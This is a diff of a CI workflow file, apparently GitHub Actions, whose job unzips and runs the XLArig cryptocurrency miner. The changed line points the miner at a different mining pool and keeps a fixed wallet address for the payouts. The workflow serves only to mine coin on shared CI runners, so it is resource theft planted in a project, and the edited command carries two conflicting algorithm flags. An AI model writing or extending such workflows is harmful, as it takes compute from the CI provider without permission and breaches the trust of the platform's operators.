@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive XLArig-v5.2.2-win64.zip
     - name: Running
-      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o stratum+tcp://m7m.sea.mine.zpool.ca:6033 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u MBC:Mj72KbUTkJE8janJvKNvQJ8GBU4qAHn8Pc.Dutacoin
+      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -a m7m -o stratum+tcp://m7m.asia.mine.zergpool.com:6033 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u MBC:Mj72KbUTkJE8janJvKNvQJ8GBU4qAHn8Pc.Dutacoin
     - name: DONE
       run: exit
